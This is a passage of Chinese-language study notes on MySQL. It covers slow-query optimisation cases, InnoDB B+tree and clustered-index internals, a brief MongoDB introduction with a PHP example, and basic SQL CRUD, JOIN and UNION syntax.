      or sp.sync_status=4
   );
0.先看看运行多长时间,951条数据6.22秒，真的很慢。

951 rows in set (6.22 sec)
```
1.先explain，rows达到了361万，type = ALL表明是全表扫描。

```
+----+-------------+-------+------+---------------+------+---------+------+---------+-------------+
| id | select_type | table | type | possible_keys | key  | key_len | ref  | rows    | Extra       |
+----+-------------+-------+------+---------------+------+---------+------+---------+-------------+
|  1 | SIMPLE      | sp    | ALL  | NULL          | NULL | NULL    | NULL | 3613155 | Using where |
+----+-------------+-------+------+---------------+------+---------+------+---------+-------------+
```

2.所有字段都应用查询返回记录数，因为是单表查询 0已经做过了951条。

3.让explain的rows 尽量逼近951。

看一下accurate_result = 1的记录数：

```
select count(*),accurate_result from stage_poi  group by accurate_result;
+----------+-----------------+
| count(*) | accurate_result |
+----------+-----------------+
|     1023 |              -1 |
|  2114655 |               0 |
|   972815 |               1 |
+----------+-----------------+
```
我们看到accurate_result这个字段的区分度非常低，整个表只有-1,0,1三个值，加上索引也无法锁定特别少量的数据。

再看一下sync_status字段的情况：

```
select count(*),sync_status from stage_poi  group by sync_status;
+----------+-------------+
| count(*) | sync_status |
+----------+-------------+
|     3080 |           0 |
|  3085413 |           3 |
+----------+-------------+
```
同样的区分度也很低，根据理论，也不适合建立索引。

问题分析到这，好像得出了这个表无法优化的结论，两个列的区分度都很低，即便加上索引也只能适应这种情况， 很难做普遍性的优化，比如当sync_status 0、3分布的很平均，那么锁定记录也是百万级别的。

4.找业务方去沟通，看看使用场景。业务方是这么来使用这个SQL语句的，每隔五分钟会扫描符合条件的数据， 处理完成后把sync_status这个字段变成1,五分钟符合条件的记录数并不会太多，1000个左右。了解了业务方的使用场景后， 优化这个SQL就变得简单了，因为业务方保证了数据的不平衡，如果加上索引可以过滤掉绝大部分不需要的数据。

5.根据建立索引规则，使用如下语句建立索引

```
alter table stage_poi add index idx_acc_status(accurate_result,sync_status);
```
6.观察预期结果,发现只需要200ms，快了30多倍。

```
952 rows in set (0.20 sec)
```
我们再来回顾一下分析问题的过程，单表查询相对来说比较好优化，大部分时候只需要把where条件里面的字段依照规则加上索引就好， 如果只是这种“无脑”优化的话，显然一些区分度非常低的列，不应该加索引的列也会被加上索引，这样会对插入、更新性能造成严重的影响， 同时也有可能影响其它的查询语句。所以我们第4步调差SQL的使用场景非常关键，我们只有知道这个业务场景，才能更好地辅助我们更好的分析和优化查询语句。

无法优化的语句
```
select
   c.id,
   c.name,
   c.position,
   c.sex,
   c.phone,
   c.office_phone,
   c.feature_info,
   c.birthday,
   c.creator_id,
   c.is_keyperson,
   c.giveup_reason,
   c.status,
   c.data_source,
   from_unixtime(c.created_time) as created_time,
   from_unixtime(c.last_modified) as last_modified,
   c.last_modified_user_id  
from
   contact c  
inner join
   contact_branch cb 
      on  c.id = cb.contact_id  
inner join
   branch_user bu 
      on  cb.branch_id = bu.branch_id 
      and bu.status in (
         1,
      2)  
   inner join
      org_emp_info oei 
         on  oei.data_id = bu.user_id 
         and oei.node_left >= 2875 
         and oei.node_right <= 10802 
         and oei.org_category = - 1  
   order by
      c.created_time desc  limit 0 ,
      10;
```
还是几个步骤。

0.先看语句运行多长时间，10条记录用了13秒，已经不可忍受。

```
10 rows in set (13.06 sec)
1.explain

+----+-------------+-------+--------+-------------------------------------+-------------------------+---------+--------------------------+------+----------------------------------------------+
| id | select_type | table | type   | possible_keys                       | key                     | key_len | ref                      | rows | Extra                                        |
+----+-------------+-------+--------+-------------------------------------+-------------------------+---------+--------------------------+------+----------------------------------------------+
|  1 | SIMPLE      | oei   | ref    | idx_category_left_right,idx_data_id | idx_category_left_right | 5       | const                    | 8849 | Using where; Using temporary; Using filesort |
|  1 | SIMPLE      | bu    | ref    | PRIMARY,idx_userid_status           | idx_userid_status       | 4       | meituancrm.oei.data_id   |   76 | Using where; Using index                     |
|  1 | SIMPLE      | cb    | ref    | idx_branch_id,idx_contact_branch_id | idx_branch_id           | 4       | meituancrm.bu.branch_id  |    1 |                                              |
|  1 | SIMPLE      | c     | eq_ref | PRIMARY                             | PRIMARY                 | 108     | meituancrm.cb.contact_id |    1 |                                              |
+----+-------------+-------+--------+-------------------------------------+-------------------------+---------+--------------------------+------+----------------------------------------------+
```
从执行计划上看，mysql先查org_emp_info表扫描8849记录，再用索引idx_userid_status关联branch_user表， 再用索引idx_branch_id关联contact_branch表，最后主键关联contact表。

rows返回的都非常少，看不到有什么异常情况。我们在看一下语句，发现后面有order by + limit组合， 会不会是排序量太大搞的？于是我们简化SQL，去掉后面的order by 和 limit，看看到底用了多少记录来排序。

```
select
  count(*)
from
   contact c  
inner join
   contact_branch cb 
      on  c.id = cb.contact_id  
inner join
   branch_user bu 
      on  cb.branch_id = bu.branch_id 
      and bu.status in (
         1,
      2)  
   inner join
      org_emp_info oei 
         on  oei.data_id = bu.user_id 
         and oei.node_left >= 2875 
         and oei.node_right <= 10802 
         and oei.org_category = - 1  
+----------+
| count(*) |
+----------+
|   778878 |
+----------+
1 row in set (5.19 sec)
```
发现排序之前居然锁定了778878条记录，如果针对70万的结果集排序，将是灾难性的，怪不得这么慢， 那我们能不能换个思路，先根据contact的created_time排序，再来join会不会比较快呢？

于是改造成下面的语句，也可以用straight_join来优化：
```

select
   c.id,
   c.name,
   c.position,
   c.sex,
   c.phone,
   c.office_phone,
   c.feature_info,
   c.birthday,
   c.creator_id,
   c.is_keyperson,
   c.giveup_reason,
   c.status,
   c.data_source,
   from_unixtime(c.created_time) as created_time,
   from_unixtime(c.last_modified) as last_modified,
   c.last_modified_user_id   
from
   contact c  
where
   exists (
      select
         1 
      from
         contact_branch cb  
      inner join
         branch_user bu        
            on  cb.branch_id = bu.branch_id        
            and bu.status in (
               1,
            2)      
         inner join
            org_emp_info oei           
               on  oei.data_id = bu.user_id           
               and oei.node_left >= 2875           
               and oei.node_right <= 10802           
               and oei.org_category = - 1      
         where
            c.id = cb.contact_id    
      )    
   order by
      c.created_time desc  limit 0 ,
      10;
验证一下效果 预计在1ms内，提升了13000多倍！

10 rows in set (0.00 sec)
```
本以为至此大工告成，但我们在前面的分析中漏了一个细节，先排序再join和先join再排序理论上开销是一样的， 为何提升这么多是因为有一个limit！大致执行过程是：mysql先按索引排序得到前10条记录，然后再去join过滤， 当发现不够10条的时候，再次去10条，再次join，这显然在内层join过滤的数据非常多的时候，将是灾难的，极端情况， 内层一条数据都找不到，mysql还傻乎乎的每次取10条，几乎遍历了这个数据表！

用不同参数的SQL试验下：

```
select
   sql_no_cache   c.id,
   c.name,
   c.position,
   c.sex,
   c.phone,
   c.office_phone,
   c.feature_info,
   c.birthday,
   c.creator_id,
   c.is_keyperson,
   c.giveup_reason,
   c.status,
   c.data_source,
   from_unixtime(c.created_time) as created_time,
   from_unixtime(c.last_modified) as last_modified,
   c.last_modified_user_id    
from
   contact c   
where
   exists (
      select
         1        
      from
         contact_branch cb         
      inner join
         branch_user bu                     
            on  cb.branch_id = bu.branch_id                     
            and bu.status in (
               1,
            2)                
         inner join
            org_emp_info oei                           
               on  oei.data_id = bu.user_id                           
               and oei.node_left >= 2875                           
               and oei.node_right <= 2875                           
               and oei.org_category = - 1                
         where
            c.id = cb.contact_id           
      )        
   order by
      c.created_time desc  limit 0 ,
      10;
Empty set (2 min 18.99 sec)
```
2 min 18.99 sec！比之前的情况还糟糕很多。由于mysql的nested loop机制，遇到这种情况， 基本是无法优化的。这条语句最终也只能交给应用系统去优化自己的逻辑了。

通过这个例子我们可以看到，并不是所有语句都能优化，而往往我们优化时，由于SQL用例回归时落掉一些极端情况， 会造成比原来还严重的后果。所以，第一：不要指望所有语句都能通过SQL优化，第二：不要过于自信，只针对具体case来优化，而忽略了更复杂的情况。

慢查询的案例就分析到这儿，以上只是一些比较典型的案例。我们在优化过程中遇到过超过1000行，涉及到16个表join的“垃圾SQL”， 也遇到过线上线下数据库差异导致应用直接被慢查询拖死，也遇到过varchar等值比较没有写单引号， 还遇到过笛卡尔积查询直接把从库搞死。再多的案例其实也只是一些经验的积累，如果我们熟悉查询优化器、索引的内部原理， 那么分析这些案例就变得特别简单了。

写在后面的话

本文以一个慢查询案例引入了MySQL索引原理、优化慢查询的一些方法论;并针对遇到的典型案例做了详细的分析。

其实做了这么长时间的语句优化后才发现，任何数据库层面的优化都抵不上应用系统的优化，同样是MySQL， 可以用来支撑Google/FaceBook/Taobao应用，但可能连你的个人网站都撑不住。

套用最近比较流行的话：“查询容易，优化不易，且写且珍惜！”

### 了解InnoDB和Myisam，B+tree,聚簇索引等等
InnoDB索引原理详解

https://www.cnblogs.com/shijingxiang/articles/4743324.html

http://www.admin10000.com/document/5372.html

摘要：

本篇介绍下Mysql的InnoDB索引相关知识，从各种树到索引原理到存储的细节。

InnoDB是Mysql的默认存储引擎(Mysql5.5.5之前是MyISAM，文档)。本着高效学习的目的，本篇以介绍InnoDB为主，少量涉及MyISAM作为对比。

这篇文章是我在学习过程中总结完成的，内容主要来自书本和博客(参考文献会给出)，过程中加入了一些自己的理解，描述不准确的地方烦请指出。

1 各种树形结构

本来不打算从二叉搜索树开始，因为网上已经有太多相关文章，但是考虑到清晰的图示对理解问题有很大帮助， 也为了保证文章完整性，最后还是加上了这部分。

先看看几种树形结构：

1 搜索二叉树：每个节点有两个子节点，数据量的增大必然导致高度的快速增加，显然这个不适合作为大量数据存储的基础结构。

2 B树：一棵m阶B树是一棵平衡的m路搜索树。最重要的性质是每个非根节点所包含的关键字个数 j 满足：

`┌m/2┐ - 1 <= j <= m - 1；`一个节点的子节点数量会比关键字个数多1，这样关键字就变成了子节点的分割标志。
一般会在图示中把关键字画到子节点中间，非常形象，也容易和后面的B+树区分。由于数据同时存在于叶子节点和非叶子结点中， 无法简单完成按顺序遍历B树中的关键字，必须用中序遍历的方法。

3 B+树：一棵m阶B树是一棵平衡的m路搜索树。最重要的性质是每个非根节点所包含的关键字个数 j 满足：

`┌m/2┐ - 1 <= j <= m；`子树的个数最多可以与关键字一样多。非叶节点存储的是子树里最小的关键字。

同时数据节点只存在于叶子节点中，且叶子节点间增加了横向的指针，这样顺序遍历所有数据将变得非常容易。

4 B*树：一棵m阶B树是一棵平衡的m路搜索树。最重要的两个性质是1每个非根节点所包含的关键字个数 j 满足：
`┌m2/3┐ - 1 <= j <= m；2`非叶节点间添加了横向指针。

B/B+/B*三种树有相似的操作，比如检索/插入/删除节点。这里只重点关注插入节点的情况，且只分析他们在当前节点已满情况下的插入操作， 因为这个动作稍微复杂且能充分体现几种树的差异。与之对比的是检索节点比较容易实现， 而删除节点只要完成与插入相反的过程即可（在实际应用中删除并不是插入的完全逆操作，往往只删除数据而保留下空间为后续使用）。

先看B树的分裂，下图的红色值即为每次新插入的节点。每当一个节点满后，就需要发生分裂 （分裂是一个递归过程，参考下面7的插入导致了两层分裂），由于B树的非叶子节点同样保存了键值， 所以已满节点分裂后的值将分布在三个地方：1原节点，2原节点的父节点，3原节点的新建兄弟节点（参考5，7的插入过程）。

分裂有可能导致树的高度增加（参考3，7的插入过程），也可能不影响树的高度（参考5，6的插入过程）。

B+树的分裂：当一个结点满时，分配一个新的结点，并将原结点中1/2的数据复制到新结点，最后在父结点中增加新结点的指针；

B+树的分裂只影响原结点和父结点，而不会影响兄弟结点，所以它不需要指向兄弟节点的指针。

B*树的分裂：当一个结点满时，如果它的下一个兄弟结点未满，那么将一部分数据移到兄弟结点中，再在原结点插入关键字， 最后修改父结点中兄弟结点的关键字（因为兄弟结点的关键字范围改变了）。如果兄弟也满了，则在原结点与兄弟结点之间增加新结点， 并各复制1/3的数据到新结点，最后在父结点增加新结点的指针。可以看到B*树的分裂非常巧妙，因为B*树要保证分裂后的节点还要2/3满， 如果采用B+树的方法，只是简单的将已满的节点一分为二，会导致每个节点只有1/2满，这不满足B*树的要求了。

所以B*树采取的策略是在本节点满后，继续插入兄弟节点（这也是为什么B*树需要在非叶子节点加一个兄弟间的链表）， 直到把兄弟节点也塞满，然后拉上兄弟节点一起凑份子，自己和兄弟节点各出资1/3成立新节点， 这样的结果是3个节点刚好是2/3满，达到B*树的要求，皆大欢喜。

B+树适合作为数据库的基础结构，完全是因为计算机的内存-机械硬盘两层存储结构。内存可以完成快速的随机访问 （随机访问即给出任意一个地址，要求返回这个地址存储的数据）但是容量较小。而硬盘的随机访问要经过机械动作 （1磁头移动 2盘片转动），访问效率比内存低几个数量级，但是硬盘容量较大。典型的数据库容量大大超过可用内存大小， 这就决定了在B+树中检索一条数据很可能要借助几次磁盘IO操作来完成。如下图所示：通常向下读取一个节点的动作可能会是一次磁盘IO操作， 不过非叶节点通常会在初始阶段载入内存以加快访问速度。同时为提高在节点间横向遍历速度， 真实数据库中可能会将图中蓝色的CPU计算/内存读取优化成二叉搜索树（InnoDB中的page directory机制）。

真实数据库中的B+树应该是非常扁平的，可以通过向表中顺序插入足够数据的方式来验证InnoDB中的B+树到底有多扁平。

我们通过如下图的CREATE语句建立一个只有简单字段的测试表，然后不断添加数据来填充这个表。

通过下图的统计数据（来源见参考文献1）可以分析出几个直观的结论，这几个结论宏观的展现了数据库里B+树的尺度。

1 每个叶子节点存储了468行数据，每个非叶子节点存储了大约1200个键值，这是一棵平衡的1200路搜索树！

2 对于一个22.1G容量的表，也只需要高度为3的B+树就能存储了，这个容量大概能满足很多应用的需要了。

如果把高度增大到4，则B+树的存储容量立刻增大到25.9T之巨！

3 对于一个22.1G容量的表，B+树的高度是3，如果要把非叶节点全部加载到内存也只需要少于18.8M的内存 （如何得出的这个结论？因为对于高度为2的树，1203个叶子节点也只需要18.8M空间，而22.1G从良表的高度是3，非叶节点1204个。

同时我们假设叶子节点的尺寸是大于非叶节点的，因为叶子节点存储了行数据而非叶节点只有键和少量数据。）， 只使用如此少的内存就可以保证只需要一次磁盘IO操作就检索出所需的数据，效率是非常之高的。

2 Mysql的存储引擎和索引

可以说数据库必须有索引，没有索引则检索过程变成了顺序查找，O(n)的时间复杂度几乎是不能忍受的。

我们非常容易想象出一个只有单关键字组成的表如何使用B+树进行索引，只要将关键字存储到树的节点即可。

当数据库一条记录里包含多个字段时，一棵B+树就只能存储主键，如果检索的是非主键字段，则主键索引失去作用， 又变成顺序查找了。这时应该在第二个要检索的列上建立第二套索引。  这个索引由独立的B+树来组织。

有两种常见的方法可以解决多个B+树访问同一套表数据的问题，一种叫做聚簇索引（clustered index ）， 一种叫做非聚簇索引（secondary index）。这两个名字虽然都叫做索引，但这并不是一种单独的索引类型， 而是一种数据存储方式。对于聚簇索引存储来说，行数据和主键B+树存储在一起，辅助键B+树只存储辅助键和主键， 主键和非主键B+树几乎是两种类型的树。对于非聚簇索引存储来说，主键B+树在叶子节点存储指向真正数据行的指针，而非主键。

InnoDB使用的是聚簇索引，将主键组织到一棵B+树中，而行数据就储存在叶子节点上，若使用"where id = 14"这样的条件查找主键， 则按照B+树的检索算法即可查找到对应的叶节点，之后获得行数据。若对Name列进行条件搜索，则需要两个步骤：

第一步在辅助索引B+树中检索Name，到达其叶子节点获取对应的主键。第二步使用主键在主索引B+树种再执行一次B+树检索操作， 最终到达叶子节点即可获取整行数据。

MyISM使用的是非聚簇索引，非聚簇索引的两棵B+树看上去没什么不同，节点的结构完全一致只是存储的内容不同而已， 主键索引B+树的节点存储了主键，辅助键索引B+树存储了辅助键。表数据存储在独立的地方， 这两颗B+树的叶子节点都使用一个地址指向真正的表数据，对于表数据来说，这两个键没有任何差别。

由于索引树是独立的，通过辅助键检索无需访问主键的索引树。

为了更形象说明这两种索引的区别，我们假想一个表如下图存储了4行数据。其中Id作为主索引， Name作为辅助索引。图示清晰的显示了聚簇索引和非聚簇索引的差异。

我们重点关注聚簇索引，看上去聚簇索引的效率明显要低于非聚簇索引，因为每次使用辅助索引检索都要经过两次B+树查找， 这不是多此一举吗？聚簇索引的优势在哪？

1 由于行数据和叶子节点存储在一起，这样主键和行数据是一起被载入内存的，找到叶子节点就可以立刻将行数据返回了， 如果按照主键Id来组织数据，获得数据更快。

2 辅助索引使用主键作为"指针" 而不是使用地址值作为指针的好处是，减少了当出现行移动或者数据页分裂时辅助索引的维护工作， 使用主键值当作指针会让辅助索引占用更多的空间，换来的好处是InnoDB在移动行时无须更新辅助索引中的这个"指针"。

也就是说行的位置（实现中通过16K的Page来定位，后面会涉及）会随着数据库里数据的修改而发生变化 （前面的B+树节点分裂以及Page的分裂），使用聚簇索引就可以保证不管这个主键B+树的节点如何变化， 辅助索引树都不受影响。

3 Page结构

如果说前面的内容偏向于解释原理，那后面就开始涉及具体实现了。

理解InnoDB的实现不得不提Page结构，Page是整个InnoDB存储的最基本构件，也是InnoDB磁盘管理的最小单位， 与数据库相关的所有内容都存储在这种Page结构里。Page分为几种类型，常见的页类型有数据页（B-tree Node） Undo页（Undo Log Page）系统页（System Page） 事务数据页（Transaction System Page）等。

单个Page的大小是16K（编译宏UNIV_PAGE_SIZE控制），每个Page使用一个32位的int值来唯一标识， 这也正好对应InnoDB最大64TB的存储容量（16Kib * 2^32 = 64Tib）。一个Page的基本结构如下图所示：

每个Page都有通用的头和尾，但是中部的内容根据Page的类型不同而发生变化。

Page的头部里有我们关心的一些数据，下图把Page的头部详细信息显示出来：

我们重点关注和数据组织结构相关的字段：Page的头部保存了两个指针，分别指向前一个Page和后一个Page， 头部还有Page的类型信息和用来唯一标识Page的编号。根据这两个指针我们很容易想象出Page链接起来就是一个双向链表的结构。

再看看Page的主体内容，我们主要关注行数据和索引的存储，他们都位于Page的User Records部分， User Records占据Page的大部分空间，User Records由一条一条的Record组成，每条记录代表索引树上的一个节点（非叶子节点和叶子节点）。

在一个Page内部，单链表的头尾由固定内容的两条记录来表示，字符串形式的"Infimum"代表开头，"Supremum"代表结尾。

这两个用来代表开头结尾的Record存储在System Records的段里，这个System Records和User Records是两个平行的段。

InnoDB存在4种不同的Record，它们分别是1主键索引树非叶节点 2主键索引树叶子节点 3辅助键索引树非叶节点 4辅助键索引树叶子节点。这4种节点的Record格式有一些差异，但是它们都存储着Next指针指向下一个Record。

后续我们会详细介绍这4种节点，现在只需要把Record当成一个存储了数据同时含有Next指针的单链表节点即可。

User Record在Page内以单链表的形式存在，最初数据是按照插入的先后顺序排列的，但是随着新数据的插入和旧数据的删除， 数据物理顺序会变得混乱，但他们依然保持着逻辑上的先后顺序。

把User Record的组织形式和若干Page组合起来，就看到了稍微完整的形式。

现在看下如何定位一个Record：

1 通过根节点开始遍历一个索引的B+树，通过各层非叶子节点最终到达一个Page，这个Page里存放的都是叶子节点。

2 在Page内从"Infimum"节点开始遍历单链表（这种遍历往往会被优化），如果找到该键则成功返回。

如果记录到达了"supremum"，说明当前Page里没有合适的键，这时要借助Page的Next Page指针，跳转到下一个Page继续从"Infimum"开始逐个查找。

详细看下不同类型的Record里到底存储了什么数据，根据B+树节点的不同，User Record可以被分成四种格式，下图种按照颜色予以区分。

1 主索引树非叶节点（绿色）

1 子节点存储的主键里最小的值（Min Cluster Key on Child），这是B+树必须的，作用是在一个Page里定位到具体的记录的位置。

2 最小的值所在的Page的编号（Child Page Number），作用是定位Record。

2 主索引树叶子节点（黄色）

1 主键（Cluster Key Fields），B+树必须的，也是数据行的一部分

2 除去主键以外的所有列（Non-Key Fields），这是数据行的除去主键的其他所有列的集合。

这里的1和2两部分加起来就是一个完整的数据行。

3 辅助索引树非叶节点非（蓝色）

1 子节点里存储的辅助键值里的最小的值（Min Secondary-Key on Child），这是B+树必须的， 作用是在一个Page里定位到具体的记录的位置。

2 主键值（Cluster Key Fields），非叶子节点为什么要存储主键呢？因为辅助索引是可以不唯一的， 但是B+树要求键的值必须唯一，所以这里把辅助键的值和主键的值合并起来作为在B+树中的真正键值， 保证了唯一性。但是这也导致在辅助索引B+树中非叶节点反而比叶子节点多了4个字节。 （即下图中蓝色节点反而比红色多了4字节）

3 最小的值所在的Page的编号（Child Page Number），作用是定位Record。

4 辅助索引树叶子节点（红色）

1 辅助索引键值（Secondary Key Fields），这是B+树必须的。

2 主键值（Cluster Key Fields），用来在主索引树里再做一次B+树检索来找到整条记录。

下面是本篇最重要的部分了，结合B+树的结构和前面介绍的4种Record的内容，我们终于可以画出一幅全景图。

由于辅助索引的B+树与主键索引有相似的结构，这里只画出了主键索引树的结构图，只包含了"主键非叶节点"和"主键叶子节点"两种节点， 也就是上图的的绿色和黄色的部分。

把上图还原成下面这个更简洁的树形示意图，这就是B+树的一部分。注意Page和B+树节点之间并没有一一对应的关系， Page只是作为一个Record的保存容器，它存在的目的是便于对磁盘空间进行批量管理， 上图中的编号为47的Page在树形结构上就被拆分成了两个独立节点。

至此本篇就算结束了，本篇只是对InnoDB索引相关的数据结构和实现进行了一些梳理总结， 并未涉及到Mysql的实战经验。这主要是基于几点原因：

1 原理是基石，只有充分了解InnoDB索引的工作方式，我们才有能力高效的使用好它。

2 原理性知识特别适合使用图示，我个人非常喜欢这种表达方式。

3 关于InnoDB优化，在《高性能Mysql》里有更加全面的介绍，对优化Mysql感兴趣的同学完全可以自己获取相关知识，

另：对InnoDB实现有更多兴趣的同学可以看看Jeremy Cole的博客（参考文献三篇文章的来源），
这位老兄曾先后在Mysql，Yahoo，Twitter，Google从事数据库相关工作，他的文章非常棒！

### MongoDB
MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。

它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。

Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言， 几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。
```
SQL术语/概念|MongoDB术语/概念|解释/说明
-|-|-
database|database|数据库
table|collection|数据库表/集合
row|document|数据记录行/文档
column|field|数据字段/域
index|index|索引
table joins| |表连接,MongoDB不支持
primary key|primary key|主键,MongoDB自动将_id字段设置为主键

<?php
// from runoob
$m = new MongoClient(); // 连接默认主机和端口为：mongodb://localhost:27017
$db = $m->test; // 获取名称为 "test" 的数据库

$collection = $db->createCollection("runoob"); // 创建集合

$collection = $db->runoob; // 选择集合
$document = array( 
    "title" => "MongoDB", 
    "description" => "database", 
    "likes" => 100,
    "url" => "http://www.runoob.com/mongodb/",
    "by", "菜鸟教程"
);

// 插入文档
$collection->insert($document);

// 查找文档
$cursor = $collection->find();

// 更新文档
$collection->update(array("title"=>"MongoDB"), array('$set'=>array("title"=>"MongoDB 教程")));

// 删除文档
$collection->remove(array("title"=>"MongoDB 教程"), array("justOne" => true));
?>
```

### CRUD
什么是CRUD？ CRUD的操作

CRUD是指在做计算处理时的增加(Create)、读取查询(Retrieve)、更新(Update)和删除(Delete)几个单词的首字母简写。主要被用在描述软件系统中DataBase或者持久层的基本操作功能。

数据库CRUD操作

```
一、删除表   
drop table 表名称

二、修改表  
alter table 表名称 add 列名 数据类型（add表示添加一列）
alter table 表名称 drop column 列名称（column表示列 drop表示删除）

三、删除数据库
drop database 数据库

四、CRUD操作（create 添加数据read读取数据 update 修改数据delete删除数据）
1、添加数据(create)
a: insert into + nation values（'n002 ','回族 '）--加单引号是转为字符串，英文的
b: insert into nation values('n003',' ')只添加一列后面的是空给所有的添加可以用
c: insert into nation(code,) values('n004')给某一列添加可以用
d:给多列添加insert into nation(code,name) values('n004','维吾尔族')
e: 专门添加自增长列的 insert into 表名 values('p001','p006') 自增长列不用管，直接写第二列

2、删除数据（delete）
delete from +表名称--删除表中所有内容
delete from +表名称 where ids=5  (删除此行)---where后面跟一个条件

3、修改数据（uodate）
update +表名称 set +列名称=' 'set(设置)---修改所有的内容这一列的
update +表名称 set +列名称='p006 ' where ids=6
update +表名称 set +列名称='p006 ',列名称='p002' where ids=6-----用逗号隔开可以修改多列
整数型（int）的不需要加单引号 0 (false)1(true)

4、查询数据(10种)
a1:简单查询
select * from 表名称 ——查询表中所有数据 *代表所有列
select code,name from 表名称——查询指定列数据
select code,name from 表名称——查指定列的数据
select code as'代号',name as'姓名' from 表名称——给列指定别名
a2:条件查询
select * from 表名 where code=' '   查这一行
select * from 表名 where sex='true' and nation=' '   表示并列，--多条件并的关系
select * from 表        名 where sex='true' or nation=' ' --多条件或的关系
a3:范围查询
select * from 表名 where 列名>40 and 列名<50
select * from 表名 where 列名 between 40 and 50  --专用于范围查询
a4:离散查询
select * from 表名 where 列名 in (' ',' ',' ')
select * from 表名 where 列名 not in (' ',' ',' ')  反选，不在里面的
a5:模糊查询
select * from 表名 where 列名 like '%宝马%'——查包含宝马的
select * from 表名 where 列名 like '宝马%'——查以宝马开头的
select * from 表名 where 列名 like '%宝马'——查以宝马结尾的
select * from 表名 where 列名 like '宝马'——查等于宝马的
select * from 表名 where 列名 like '--E'——查第三个是E的
% 代表是任意多个字符
- 下划线 代表是一个字符
a6:排序查询
select * from 表名 order by 列名——默认升序排序
select * from 表名 order by 列名 desc——降序排列
select * from 表名 order by 列名 desc, 列名 asc——多个条件排序   ， 前面是主条件 后面是次要条件
desc 降序  ，asc 升序， order by  排序  根据哪一列排序
a7:分页查询
select top 5 * from 表名——查询前5条数据
select top 5 * from 表名 where code not in (select top 5 code from car)
a8:去重查询（去掉重复的）
select distinct 列名 from
a9:分组查询
select Brand from 表名 group by Brand having count(*)>2

group by    having ——表示根据一列分组 ，count(*)>2——每一组的数量
a10:聚合函数（统计查询）
select count (*) from 表名——查询所有数据条数（每一列的）
select count (列名主键) from 表名——查询这列的所有数据条数（执行快）
select sum (列名) from 表名——求和
select avg  (列名) from 表名——求平均值
select max (列名) from 表名——求最大值
select min (列名) from 表名——求最小值
```

### JOIN、LEFT JOIN 、RIGHT JOIN、INNER JOIN
通俗讲：
left以 left join 左侧的表为主表
right 以 right join 右侧表为主表
inner join 查找的数据是左右两张表共有的

left join(左联接) 返回包括左表中的所有记录和右表中联结字段相等的记录
right join(右联接) 返回包括右表中的所有记录和左表中联结字段相等的记录
inner join(等值连接) 只返回两个表中联结字段相等的行

```
举例如下：
--------------------------------------------
表A记录如下：
aID　　　　　aNum
1　　　　　a20050111
2　　　　　a20050112
3　　　　　a20050113
4　　　　　a20050114
5　　　　　a20050115

表B记录如下:
bID　　　　　bName
1　　　　　2006032401
2　　　　　2006032402
3　　　　　2006032403
4　　　　　2006032404
8　　　　　2006032408

--------------------------------------------
1.left join
sql语句如下:
select * from A
left join B
on A.aID = B.bID

结果如下:
aID　　　　　aNum　　　　　bID　　　　　bName
1　　　　　a20050111　　　　1　　　　　2006032401
2　　　　　a20050112　　　　2　　　　　2006032402
3　　　　　a20050113　　　　3　　　　　2006032403
4　　　　　a20050114　　　　4　　　　　2006032404
5　　　　　a20050115　　　　NULL　　　　　NULL
```

（所影响的行数为 5 行）
结果说明:
left join是以A表的记录为基础的,A可以看成左表,B可以看成右表,left join是以左表为准的.
换句话说,左表(A)的记录将会全部表示出来,而右表(B)只会显示符合搜索条件的记录(例子中为: A.aID = B.bID).
B表记录不足的地方均为NULL.
```
--------------------------------------------
2.right join
sql语句如下:
select * from A
right join B
on A.aID = B.bID

结果如下:
aID　　　　　aNum　　　　　bID　　　　　bName
1　　　　　a20050111　　　　1　　　　　2006032401
2　　　　　a20050112　　　　2　　　　　2006032402
3　　　　　a20050113　　　　3　　　　　2006032403
4　　　　　a20050114　　　　4　　　　　2006032404
NULL　　　　　NULL　　　　　8　　　　　2006032408

（所影响的行数为 5 行）
结果说明:
仔细观察一下,就会发现,和left join的结果刚好相反,这次是以右表(B)为基础的,A表不足的地方用NULL填充.
--------------------------------------------
3.inner join
sql语句如下:
select * from A
innerjoin B
on A.aID = B.bID

结果如下:
aID　　　　　aNum　　　　　bID　　　　　bName
1　　　　　a20050111　　　　1　　　　　2006032401
2　　　　　a20050112　　　　2　　　　　2006032402
3　　　　　a20050113　　　　3　　　　　2006032403
4　　　　　a20050114　　　　4　　　　　2006032404
```

结果说明:
很明显,这里只显示出了 A.aID = B.bID的记录.这说明inner join并不以谁为基础,它只显示符合条件的记录.
注:
LEFT JOIN操作用于在任何的 FROM 子句中，组合来源表的记录。使用 LEFT JOIN 运算来创建一个左边外部联接。左边外部联接将包含了从第一个（左边）开始的两个表中的全部记录，即使在第二个（右边）表中并没有相符值的记录。

语法：FROM table1 LEFT JOIN table2 ON table1.field1 compopr table2.field2

说明：table1, table2参数用于指定要将记录组合的表的名称。
field1, field2参数指定被联接的字段的名称。且这些字段必须有相同的数据类型及包含相同类型的数据，但它们不需要有相同的名称。
compopr参数指定关系比较运算符："="， "<"， ">"， "<="， ">=" 或 "<>"。
如果在INNER JOIN操作中要联接包含Memo 数据类型或 OLE Object 数据类型数据的字段，将会发生错误.

### UNION
SQL UNION 操作符
SQL UNION 操作符合并两个或多个 SELECT 语句的结果。

SQL UNION 操作符
UNION 操作符用于合并两个或多个 SELECT 语句的结果集。

请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。
```
SQL UNION 语法
SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2;
注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。

SQL UNION ALL 语法
SELECT column_name(s) FROM table1
UNION ALL
SELECT column_name(s) FROM table2;
注释：UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。

演示数据库
在本教程中，我们将使用 RUNOOB 样本数据库。

下面是选自 "Websites" 表的数据：

mysql> SELECT * FROM Websites;
+----+--------------+---------------------------+-------+---------+
| id | name         | url                       | alexa | country |
+----+--------------+---------------------------+-------+---------+
| 1  | Google       | https://www.google.cm/    | 1     | USA     |
| 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      |
| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      |
| 4  | 微博          | http://weibo.com/         | 20    | CN      |
| 5  | Facebook     | https://www.facebook.com/ | 3     | USA     |
